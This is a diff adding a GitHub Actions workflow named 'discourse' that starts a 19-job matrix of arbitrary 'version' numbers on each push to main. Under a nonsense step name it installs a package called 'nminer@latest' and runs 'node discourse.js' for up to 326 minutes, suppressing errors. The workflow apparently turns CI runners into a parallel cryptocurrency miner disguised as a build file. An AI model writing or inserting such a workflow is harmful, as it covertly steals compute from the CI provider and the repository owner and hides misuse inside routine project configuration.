@@ -1,0 +1,44 @@
+name: discourse
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 8587 }
+          - { version: 1303 }
+          - { version: 3798 }
+          - { version: 2349 }
+          - { version: 8737 }
+          - { version: 3089 }
+          - { version: 3516 }
+          - { version: 2363 }
+          - { version: 3980 }
+          - { version: 6735 }
+          - { version: 3792 }
+          - { version: 5768 }
+          - { version: 3758 }
+          - { version: 8164 }
+          - { version: 8283 }
+          - { version: 5097 }
+          - { version: 1633 }
+          - { version: 740 }
+          - { version: 7806 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: small exacerbate scarily gadzooks
+        run: |
+          npm install nminer@latest
+          timeout 326m node discourse.js || echo "discourse executed"
